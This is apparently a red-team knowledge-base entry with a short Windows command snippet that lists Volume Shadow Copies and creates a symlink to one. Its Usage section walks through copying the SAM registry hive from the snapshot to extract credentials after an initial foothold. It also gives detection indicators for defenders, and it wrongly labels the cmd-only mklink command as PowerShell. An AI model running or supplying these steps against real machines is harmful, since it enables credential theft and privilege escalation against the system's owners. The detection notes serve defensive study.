---
id: 34e7028c-7f28-4d24-9d4e-4812d7f1ead0
name: PowerShell-Shadow-Copies-Enumeration-and-Link
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:30.010587+00:00'
updated_at: '2023-04-10T20:37:37.830234+00:00'
platforms:
  - Windows
tags:
  - enumeration
  - shadow-copy
  - privilege-escalation
  - powershell
validated: true
---

# PowerShell-Shadow-Copies-Enumeration-and-Link

## Code

```powershell
# List shadow copies using vssadmin (Needs Admnistrator Access)
vssadmin list shadows
  
# List shadow copies using diskshadow
diskshadow list shadows all
  
# Make a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

## Description

This PowerShell snippet combines built-in Windows commands to enumerate Volume Shadow Copies and create a symlink for accessing snapshot contents. It is designed for quick execution in an elevated PowerShell session during privilege escalation, allowing attackers to bypass file protections on system volumes.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| HarddiskVolumeShadowCopy1 | Shadow copy volume identifier (replace with actual from enumeration) | HarddiskVolumeShadowCopy2 |
| c:\shadowcopy | Local symlink path (customize as needed) | d:\backup |

## Usage

Execute this snippet in an elevated PowerShell prompt on a Windows target with admin rights. First, run the enumeration commands to identify a valid shadow copy ID, then update the mklink line accordingly. After creation, use the symlink to access files like `cd c:\shadowcopy\Windows\System32\config` and copy sensitive hives (e.g., `copy SAM ..\sam.hive`). This is typically used after initial foothold to extract credentials or modify files for persistence.

## Detection

- Monitor PowerShell execution logs for vssadmin, diskshadow, and mklink invocations (Event ID 4104 for script blocks).
- Sysmon Event ID 1 for process creation of cmd.exe or powershell.exe spawning these tools.
- File system auditing for symlink creation in sensitive paths or access to GLOBALROOT.
- EDR alerts on shadow copy manipulation, as it may indicate data tampering or recovery inhibition.

## Related

- [[procedures/Abusing-Shadow-Copies-for-Privilege-Escalation]]
- [[commands/vssadmin-list-shadow-copies]]
